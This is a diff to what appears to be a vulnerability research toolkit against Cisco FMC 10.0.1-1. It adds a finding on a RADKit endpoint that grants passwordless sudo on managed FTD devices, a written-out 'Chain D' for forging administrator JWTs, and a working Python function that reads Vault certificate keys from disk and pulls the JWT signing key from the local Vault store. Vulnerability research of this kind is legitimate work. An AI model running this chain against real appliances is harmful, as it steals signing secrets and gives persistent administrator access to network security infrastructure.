@@ -81,7 +81,10 @@ FMC-F6: Unsalted SHA-1 Password Hashing (cwpass.xml) [HIGH]
 
 FMC-F7: RADKit sudoaccess Endpoint — Managed FTD Device Root [CRITICAL]
   Endpoint: PUT /api/fmc_troubleshoot/v1/domain/{domainUUID}/radkit/sudoaccess
-  Perl module: sf/lib/perl/5.34.3/DCCSM/RADKitLogsList.pm
+  SOURCE PROOF: sf/lib/perl/5.34.3/SF/RADKit/RADKitAccess.pm
+    RADKIT_SUDO_ACCESS_NO_PASSWORD = "ALL = NOPASSWD: ALL"
+    Written to /etc/sudoers AND /ngfw/etc/sudoers on every managed FTD device.
+    updateRADKitAccessState() called by ReconcileState plugin RADKIT_ACCESS_STATE.
   Auth-daemon strings: "Device Sudo Access", "isSudoEnabled", "PutSudoAccess",
     "AllUserRoutesPutSudoAccess", "Enable RADKit Service"
   RBAC permissions: "radkit" (view), "radkit.modify" (modify)
@@ -89,6 +92,16 @@ FMC-F7: RADKit sudoaccess Endpoint — Managed FTD Device Root [CRITICAL]
   Impact: FMC user with radkit.modify permission can enable sudo access on any managed
           FTD device — privilege escalation from FMC REST API access to FTD root shell.
   Chain: FMC REST API access (any account with radkit.modify) -> PutSudoAccess -> FTD root
+
+CHAIN D: Post-Foothold Vault Key Extraction -> Universal JWT Forge
+  Step 1: Any FMC filesystem read (via F7 RADKit, sftunnel, SSH)
+  Step 2: Read /etc/vault/admin/*/vault.key (cert key for Vault auth)
+  Step 3: POST https://127.0.0.1:8200/v1/auth/cert/login (cert-based Vault auth)
+  Step 4: GET MACHINE_USER_KEY from Vault KV store (HS256 JWT signing key)
+  Step 5: Forge HS256 JWT with any sub/username claim (e.g., "admin")
+  Step 6: Authenticate to all FMC REST API endpoints as Administrator
+  Source: sf/lib/perl/5.34.3/SF/Vault.pm (cert auth path), auth-daemon (MACHINE_USER_KEY)
+  Note: Bridges F7 -> F10; converts one-time foothold to persistent auth bypass
 
 FMC-F8: GroupId=2 Hardcoded Privileged Group SQL Query [MEDIUM]
   Class: com.cisco.nm.vms.ogs.client.CsmCustomOgsFilter (athena-rbac-server.jar)
@@ -129,7 +142,7 @@ import json
 import re
 from typing import Optional
 
-VERSION = "1.0.0"
+VERSION = "1.1.0"
 TARGET = "Cisco FMC 10.0.1-1"
 
 
@@ -420,6 +433,51 @@ def probe_saml_port_2080(host: str = "127.0.0.1") -> dict:
         return {"status": r.status_code, "body": r.text[:300], "finding": "FMC-F9"}
     except Exception as e:
         return {"error": str(e), "note": "Expected — port 2080 should be localhost only"}
+
+
+# ── Chain D: Vault cert-auth -> JWT forge ─────────────────────────────────────
+
+def probe_vault_chain_d(vault_key_path: str = "/etc/vault/admin") -> dict:
+    """
+    Chain D probe (post-foothold, localhost only).
+    Step 1: List /etc/vault/admin/ for cert key file
+    Step 2: Attempt cert-based Vault auth at https://127.0.0.1:8200/v1/auth/cert/login
+    Step 3: Retrieve MACHINE_USER_KEY from Vault KV
+    Source: SF/Vault.pm cert auth path; auth-daemon MACHINE_USER_KEY string.
+    Requires filesystem access already obtained (F7 pivot or equivalent).
+    """
+    import glob, os
+    result = {"finding": "CHAIN-D", "vault_host": "https://127.0.0.1:8200"}
+    key_files = glob.glob(f"{vault_key_path}/*/vault.key")
+    result["vault_key_candidates"] = key_files
+    if not key_files:
+        result["status"] = "no_key_found"
+        return result
+    result["vault_key"] = key_files[0]
+    try:
+        r = requests.post(
+            "https://127.0.0.1:8200/v1/auth/cert/login",
+            cert=(key_files[0], key_files[0]),
+            verify=False,
+            timeout=5,
+        )
+        result["cert_auth_status"] = r.status_code
+        result["cert_auth_body"] = r.text[:500]
+        if r.status_code == 200:
+            token = r.json().get("auth", {}).get("client_token")
+            result["vault_token"] = token
+            if token:
+                kv = requests.get(
+                    "https://127.0.0.1:8200/v1/secret/data/machine_user_key",
+                    headers={"X-Vault-Token": token},
+                    verify=False,
+                    timeout=5,
+                )
+                result["machine_user_key_status"] = kv.status_code
+                result["machine_user_key_body"] = kv.text[:500]
+    except Exception as e:
+        result["error"] = str(e)
+    return result
 
 
 # ── Static analysis helpers ───────────────────────────────────────────────────
